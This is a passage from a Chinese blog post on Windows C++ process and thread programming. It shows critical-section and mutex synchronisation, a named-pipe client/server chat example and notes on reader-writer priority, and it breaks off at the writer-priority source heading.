class="built_in">ReleaseSemaphore</span>(mySemaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="线程互斥"><a href="#线程互斥" class="headerlink" title="线程互斥"></a>线程互斥</h2><p>参考：<a class="link"   href="https://blog.csdn.net/Usuitakumi/article/details/121754679" >C++互斥量-信号量-临界区 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://blog.csdn.net/Sakuya__/article/details/108416132" >Windows临界区使用 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://blog.csdn.net/self_mind/article/details/49820381" >C++临界区-互斥对象-事件对象区别 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">CRITICAL_SECTION cs;    <span class="comment">// 临界区</span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">cFunc1</span><span class="params">(LPVOID)</span></span>;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">cFunc2</span><span class="params">(LPVOID)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> cCnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">CriticalTest</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// 初始化临界区</span></span><br><span class="line">    <span class="built_in">InitializeCriticalSection</span>(&amp;cs);</span><br><span class="line">    HANDLE h1, h2;</span><br><span class="line">    h1 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, cFunc1, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    h2 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, cFunc2, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(h1, INFINITE);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(h2, INFINITE);</span><br><span class="line">    <span class="built_in">DeleteCriticalSection</span>(&amp;cs);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(h1);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(h2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">cFunc1</span><span class="params">(LPVOID)</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;func1调用并等待进入临界区\n&quot;</span>;</span><br><span class="line">    <span class="built_in">EnterCriticalSection</span>(&amp;cs);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;func1进入临界区\n&quot;</span>;</span><br><span class="line">    cCnt += <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;count = %d\n&quot;</span>, cCnt);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;func1退出临界区\n&quot;</span>;</span><br><span class="line">    <span class="built_in">LeaveCriticalSection</span>(&amp;cs);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">cFunc2</span><span class="params">(LPVOID)</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;func2调用并等待进入临界区\n&quot;</span>;</span><br><span class="line">    <span class="built_in">EnterCriticalSection</span>(&amp;cs);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;func2进入临界区\n&quot;</span>;</span><br><span class="line">    cCnt += <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;count = %d\n&quot;</span>, cCnt);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;func2退出临界区\n&quot;</span>;</span><br><span class="line">    <span class="built_in">LeaveCriticalSection</span>(&amp;cs);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HANDLE Mutex;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">mFunc1</span><span class="params">(LPVOID)</span></span>;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">mFunc2</span><span class="params">(LPVOID)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> mCnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">MutexTest</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// 初始化临界区</span></span><br><span class="line">    Mutex = <span class="built_in">CreateMutex</span>(<span class="literal">NULL</span>, <span class="number">0</span>, <span class="string">&quot;A&quot;</span>);</span><br><span class="line"></span><br><span class="line">    HANDLE h1, h2;</span><br><span class="line">    h1 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, mFunc1, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    h2 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, mFunc2, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(h1, INFINITE);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(h2, INFINITE);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">CloseHandle</span>(Mutex);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(h1);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(h2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">mFunc1</span><span class="params">(LPVOID)</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;func1调用并等待互斥信号\n&quot;</span>;</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(Mutex, INFINITE);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;func1通过互斥信号\n&quot;</span>;</span><br><span class="line">    mCnt += <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;count = %d\n&quot;</span>, mCnt);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;func1释放互斥信号\n&quot;</span>;</span><br><span class="line">    <span class="built_in">ReleaseMutex</span>(Mutex);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">mFunc2</span><span class="params">(LPVOID)</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;func2调用并等待互斥信号\n&quot;</span>;</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(Mutex, INFINITE);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;func2通过互斥信号\n&quot;</span>;</span><br><span class="line">    mCnt += <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;count = %d\n&quot;</span>, mCnt);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;func2释放互斥信号\n&quot;</span>;</span><br><span class="line">    <span class="built_in">ReleaseMutex</span>(Mutex);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;---------临界区实现线程同步---------&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="built_in">CriticalTest</span>();</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;----------互斥实现线程同步----------&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="built_in">MutexTest</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="管道通信"><a href="#管道通信" class="headerlink" title="管道通信"></a>管道通信</h2><p>参考：<a class="link"   href="https://blog.csdn.net/sinat_31608641/article/details/106868309" >C++的创建命名管道 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://www.cnblogs.com/shuzhongke/p/15261643.html" >C++进程通信之命名管道 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://blog.csdn.net/qq_15029743/article/details/79508568" >C++命名管道详解 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="参数说明-2"><a href="#参数说明-2" class="headerlink" title="参数说明"></a>参数说明</h3><p><code>PeekNamedPipe</code> 函数将数据从命名管道或匿名管道复制到缓冲区中，而不将其从管道中删除。 它还返回有关管道中的数据的信息。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">BOOL PeekNamedPipe(</span><br><span class="line">  [in]            HANDLE  hNamedPipe,</span><br><span class="line">  [out, optional] LPVOID  lpBuffer,</span><br><span class="line">  [in]            DWORD   nBufferSize,</span><br><span class="line">  [out, optional] LPDWORD lpBytesRead,</span><br><span class="line">  [out, optional] LPDWORD lpTotalBytesAvail,</span><br><span class="line">  [out, optional] LPDWORD lpBytesLeftThisMessage</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>

<p>该函数有特性：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数始终在单线程应用程序中立即返回，即使管道中没有数据也是如此。 命名管道句柄 (阻塞或非阻塞) 的等待模式对函数没有影响。</span><br></pre></td></tr></table></figure></div>

<p>这使得它不受等待模式限制，不会被阻塞。</p>
<p>对于 <code>ReadFile()</code> ，其是否等待受命名管道句柄的等待模式影响，但 <code>PIPE_NOWAIT</code> 同时对 <code>ReadFile, WriteFile, ConnectNamedPipe</code> 生效，这会导致连接管道时就不等待，管道的建立提升难度。</p>
<h3 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h3><p>服务端：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_BUF 255</span></span><br><span class="line"></span><br><span class="line">HANDLE pipe;</span><br><span class="line">HANDLE rec;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">readFile</span><span class="params">(HANDLE pipe, <span class="type">char</span> * str, string&amp; fstr)</span></span>&#123;</span><br><span class="line">    <span class="type">bool</span> suc = <span class="literal">false</span>;</span><br><span class="line">    DWORD len = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">PeekNamedPipe</span>(pipe, str, MAX_BUF * <span class="built_in">sizeof</span>(<span class="type">char</span>), &amp;len, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(len &lt;= <span class="number">0</span>)&#123;   <span class="comment">// 无消息可读</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        suc = <span class="built_in">ReadFile</span>(pipe, str, MAX_BUF * <span class="built_in">sizeof</span>(<span class="type">char</span>), &amp;len, <span class="literal">NULL</span>);    <span class="comment">// 每次读取到最多255个字符</span></span><br><span class="line">        fstr.<span class="built_in">append</span>(str);   <span class="comment">// 接入到字符串</span></span><br><span class="line">        <span class="keyword">if</span>(len&gt;<span class="number">0</span>) cnt++;</span><br><span class="line">        <span class="keyword">if</span>(!suc || len&lt;MAX_BUF)&#123;    <span class="comment">// 读取失败或者读取完毕（个数小于最大数）</span></span><br><span class="line">            <span class="keyword">return</span> cnt;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">recvCheck</span><span class="params">(LPVOID)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">1000</span>);    <span class="comment">// 每隔一秒检测是否有接收到信息</span></span><br><span class="line">        <span class="type">char</span> buf[MAX_BUF] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        string finalStr = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">int</span> flag;</span><br><span class="line">        flag = <span class="built_in">readFile</span>(pipe, buf, finalStr);</span><br><span class="line">        <span class="keyword">switch</span>(flag)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">default</span>:&#123;</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;From Client: &quot;</span>&lt;&lt;finalStr&lt;&lt;endl;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;服务端上线\n&quot;</span>&lt;&lt;<span class="string">&quot;创建命名管道并等待连接...\n&quot;</span>;</span><br><span class="line">    pipe = <span class="built_in">CreateNamedPipe</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;\\\\.\\Pipe\\zyx&quot;</span>),  <span class="comment">// 管道名称</span></span><br><span class="line">        PIPE_ACCESS_DUPLEX,     <span class="comment">// 双向管道</span></span><br><span class="line">        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,  <span class="comment">// 信息流且等待</span></span><br><span class="line">        PIPE_UNLIMITED_INSTANCES,   <span class="comment">// 示例数量无上限（255）</span></span><br><span class="line">        <span class="number">0</span>,      <span class="comment">// 输出缓冲区保留0</span></span><br><span class="line">        <span class="number">0</span>,      <span class="comment">// 输入缓冲区保留0</span></span><br><span class="line">        <span class="number">1000</span>,   <span class="comment">// 等待时长无限</span></span><br><span class="line">        <span class="number">0</span>); <span class="comment">// 安全策略默认</span></span><br><span class="line">    <span class="keyword">if</span>(pipe == INVALID_HANDLE_VALUE || pipe == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;管道创建失败!\n&quot;</span>&lt;&lt;<span class="built_in">GetLastError</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 等待连接</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">ConnectNamedPipe</span>(pipe, <span class="literal">NULL</span>) != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;连接成功，开始通信!\n&quot;</span>;</span><br><span class="line">        rec = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, recvCheck, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">        string inC;</span><br><span class="line">        DWORD dwWrite;</span><br><span class="line">        <span class="type">bool</span> flag;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">getline</span>(cin, inC);  <span class="comment">// cin忽略空白字符，因此它实际上接收不到为空的内容，换成getline就可以</span></span><br><span class="line">            <span class="keyword">if</span>(inC.<span class="built_in">length</span>()==<span class="number">0</span>)&#123;    <span class="comment">// 输入为空</span></span><br><span class="line">                <span class="comment">// 啥也不做</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(inC==<span class="string">&quot;end&quot;</span>) <span class="keyword">break</span>;   <span class="comment">// 退出</span></span><br><span class="line">                <span class="keyword">else</span>&#123;   <span class="comment">// 写入数据并传送</span></span><br><span class="line">                    flag = <span class="built_in">WriteFile</span>(pipe, inC.<span class="built_in">c_str</span>(), inC.<span class="built_in">length</span>(), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">                    <span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">                        cout&lt;&lt;<span class="string">&quot;Failed to sent data!\n&quot;</span>;</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    cout&lt;&lt;<span class="string">&quot;To Client: &quot;</span>&lt;&lt;inC&lt;&lt;endl;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;管道连接失败!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;已经关闭管道\n&quot;</span>;</span><br><span class="line">    <span class="built_in">DisconnectNamedPipe</span>(pipe);  <span class="comment">// 关闭管道连接</span></span><br><span class="line">    <span class="built_in">TerminateThread</span>(rec, <span class="number">0</span>);   <span class="comment">// 终止接收检测</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(rec);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(pipe);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;服务端下线\n&quot;</span>;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>客户端：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 客户端</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_BUF 255</span></span><br><span class="line">    </span><br><span class="line">HANDLE pipe, rec;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">readFile</span><span class="params">(HANDLE pipe, <span class="type">char</span> * str, string&amp; fstr)</span></span>&#123;</span><br><span class="line">    <span class="type">bool</span> suc = <span class="literal">false</span>;</span><br><span class="line">    DWORD len = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">PeekNamedPipe</span>(pipe, str, MAX_BUF * <span class="built_in">sizeof</span>(<span class="type">char</span>), &amp;len, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(len &lt;= <span class="number">0</span>)&#123;   <span class="comment">// 无消息可读</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        suc = <span class="built_in">ReadFile</span>(pipe, str, MAX_BUF * <span class="built_in">sizeof</span>(<span class="type">char</span>), &amp;len, <span class="literal">NULL</span>);    <span class="comment">// 每次读取到最多255个字符</span></span><br><span class="line">        fstr.<span class="built_in">append</span>(str);   <span class="comment">// 接入到字符串</span></span><br><span class="line">        <span class="keyword">if</span>(len&gt;<span class="number">0</span>) cnt++;</span><br><span class="line">        <span class="keyword">if</span>(!suc || len&lt;MAX_BUF)&#123;    <span class="comment">// 读取失败或者读取完毕（个数小于最大数）</span></span><br><span class="line">            <span class="keyword">return</span> cnt;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">recvCheck</span><span class="params">(LPVOID)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">1000</span>);    <span class="comment">// 每隔一秒检测是否有接收到信息</span></span><br><span class="line">        <span class="type">char</span> buf[MAX_BUF] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        string finalStr = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">int</span> flag;</span><br><span class="line">        flag = <span class="built_in">readFile</span>(pipe, buf, finalStr);</span><br><span class="line">        <span class="keyword">switch</span>(flag)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">default</span>:&#123;</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;From Server: &quot;</span>&lt;&lt;finalStr&lt;&lt;endl;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;客户端上线\n&quot;</span>&lt;&lt;<span class="string">&quot;按任意键开始连接命名管道...\n&quot;</span>;</span><br><span class="line">    _getch();</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;等待命名管道...\n&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">WaitNamedPipe</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;\\\\.\\Pipe\\zyx&quot;</span>), NMPWAIT_WAIT_FOREVER) == FALSE)&#123; <span class="comment">// 若命名管道没有打开则直接退出</span></span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;命名管道未上线&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;成功打开命名管道\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 开始连接命名管道</span></span><br><span class="line">    pipe = <span class="built_in">CreateFile</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;\\\\.\\Pipe\\zyx&quot;</span>), GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(pipe == <span class="literal">NULL</span> || pipe == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;管道连接失败!\n&quot;</span>&lt;&lt;<span class="built_in">GetLastError</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;连接成功,开始通信!\n&quot;</span>;</span><br><span class="line">    rec = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, recvCheck, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    string inC;</span><br><span class="line">    DWORD dwWrite;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="type">char</span> buf[MAX_BUF] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        string finalStr = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">int</span> flag;</span><br><span class="line">        <span class="built_in">getline</span>(cin, inC);</span><br><span class="line">        <span class="keyword">if</span>(inC.<span class="built_in">length</span>()==<span class="number">0</span>)&#123;    <span class="comment">// 尝试接收管道信息</span></span><br><span class="line">            <span class="comment">// 啥也不做</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(inC==<span class="string">&quot;end&quot;</span>) <span class="keyword">break</span>;   <span class="comment">// 退出</span></span><br><span class="line">            <span class="keyword">else</span>&#123;   <span class="comment">// 写入数据并传送</span></span><br><span class="line">                flag = <span class="built_in">WriteFile</span>(pipe, inC.<span class="built_in">c_str</span>(), inC.<span class="built_in">length</span>(), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">                <span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">                    cout&lt;&lt;<span class="string">&quot;Failed to sent data!&quot;</span>;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;To Server: &quot;</span>&lt;&lt;inC&lt;&lt;endl;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;已经关闭管道\n&quot;</span>;</span><br><span class="line">    <span class="built_in">DisconnectNamedPipe</span>(pipe);</span><br><span class="line">    <span class="built_in">TerminateThread</span>(rec, <span class="number">0</span>);   <span class="comment">// 终止接收检测</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(rec);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(pipe);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;客户端下线\n&quot;</span>;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通过创建子线程，定时检测有无收到管道另一端发送的数据，来实现伪实时交互，但实际上退出还是需要两端都输入end，因为一端并不能实时检测管道是否关闭并同步结束另外几个线程（把发送数据写成子线程<strong>也许</strong>可以）。</p>
<p>实际上管道的关闭体现在发送数据出错。</p>
<h2 id="读者-写者问题"><a href="#读者-写者问题" class="headerlink" title="读者-写者问题"></a>读者-写者问题</h2><p>参考：<a class="link"   href="https://zhuanlan.zhihu.com/p/189993251" >读者0写者问题 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="概念理解："><a href="#概念理解：" class="headerlink" title="概念理解："></a>概念理解：</h3><ol>
<li><p>关于读者优先，实验说明书中有如下描述：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">读者优先的附加限制：若一个读者申请进行读操作时已有另一个读者正在进行读操作，则该读者可直接开始读操作。</span><br><span class="line"></span><br><span class="line">读者优先指的是除非有写者在写文件，否则读者不需要等待。</span><br></pre></td></tr></table></figure></div>

<p>后半句附加了一个条件：有读者在等待队列时写者不做写操作，这与前半段的描述实际上是不完全一样的，但后半段概念上与”写者优先”相似，我称之为”绝对优先”思想；个人偏向于前半段的描述是对”读者优先”的准确理解，实际上读写者都在队列中时依然是按照队列顺序进行操作的。</p>
</li>
<li><p>有一个细节是读者可以多个读者同时读，因此它在”写者优先”下判定优先锁的时候是在启动时间立刻判定，若是有一个读者与写者同时启动，由于计算机内部”同时”可能意味着微小的相差，因此实际上”同时”启动的读者可能抢在写者的前面判定了优先锁，它就打破了”写者优先”的垄断，但这是不可控力导致的不绝对优先，代码逻辑上仍然是锁死了”写者优先”的。</p>
<p>而写者必须等待上个写者写完才能继续执行写操作，因此在”读者绝对优先”思想中，他判定优先锁理论上是在上一个写者写完（或上一群读者全部读完），而不是在启动时；换言之，<strong>重要的是轮到它获取资源时有没有读者在等待，而不是它申请资源时有没有读者在等待</strong>，因此判定优先锁的位置和方式不同于读者。</p>
<p>但是要实现这样的优先就必须要让得到资源的写者在检测到读者时让出资源，导致出现多余的线程切换，因此实现的代码中并没有采用”写者绝对优先思想”。</p>
</li>
<li><p>最终实现的”读者优先”代码参考的是：申请资源时有无读者在等候。</p>
</li>
<li><p>因此有同时启动的读者和写者出现的测试案例，实际上是没有意义的。</p>
</li>
</ol>
<h3 id="源码-4"><a href="#源码-4" class="headerlink" title="源码"></a>源码</h3><p>写者优先：</p>
